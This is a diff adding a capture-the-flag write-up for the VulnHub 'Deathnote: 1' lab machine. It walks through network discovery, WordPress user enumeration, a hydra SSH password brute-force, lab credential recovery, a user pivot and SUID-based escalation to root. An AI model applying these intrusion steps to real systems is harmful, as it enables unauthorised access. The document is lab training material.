@@ -1,1 +1,95 @@
+# 🔐 Deathnote: 1 — VulnHub Write-up
+
+## 🎯 Objective
+Gain root access through enumeration, credential discovery, user pivoting, and privilege escalation.
+
+## 🖥️ Environment
+Attacker: Kali Linux
+Target: Deathnote 1 (VirtualBox)
+Network: Host-only / 192.168.56.0/24
+
+## 🔎 Enumeration
+
+Find Target IP:
+netdiscover -r 192.168.56.0/24
+Result:
+Target discovered on network
+
+Network Scan:
+nmap -sS -p- <target-ip>
+Result:
+22/tcp open ssh | 80/tcp open http
+
+Add Host Entry:
+echo "<target-ip> deathnote.local" >> /etc/hosts
+Result:
+Site accessible via http://deathnote.local
+
+Identify CMS:
+Visited in browser
+Result:
+WordPress site detected
+
+WordPress Enumeration:
+wpscan --url http://deathnote.local --enumerate u
+Result:
+Valid username + exposed .txt files found
+
+## 🔑 Credential Exposure
+
+SSH Bruteforce:
+hydra -l L -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+Result:
+Credentials found → L : death4me
+
+SSH Login:
+ssh L@<target-ip>
+Result:
+Initial shell obtained
+
+Post-Login Discovery:
+Found Brainfuck-encoded text
+Decoded using interpreter
+Result:
+New credentials → kira : kiradevil
+
+User Pivot:
+su kira
+password: kiradevil
+Result:
+Privilege level increased
+
+## 🛠️ Privilege Escalation
+
+System Identification:
+uname -a | lsb_release -a
+Result:
+Outdated Linux version detected
+
+SUID Check:
+find / -perm -4000 2>/dev/null
+Result:
+Misconfigured SUID binary discovered
+
+Exploit Execution:
+Ran vulnerable SUID binary
+Result:
+whoami → root
+
+## 🏁 Final Step
+Challenge prompt appeared:
+Choice: save L or Misa
+Result:
+Machine completed successfully
+
+## ✅ Final Result
+Root access successfully obtained on the target.
+
+## 📌 Lessons Learned
+- Hostname resolution may be required to access web apps
+- WordPress enumeration can expose usernames and files
+- Hydra enables SSH access when a valid user exists
+- Encoded text (Brainfuck) may hide credentials
+- User pivoting can be necessary before privesc
+- SUID binaries are key for escalation
 
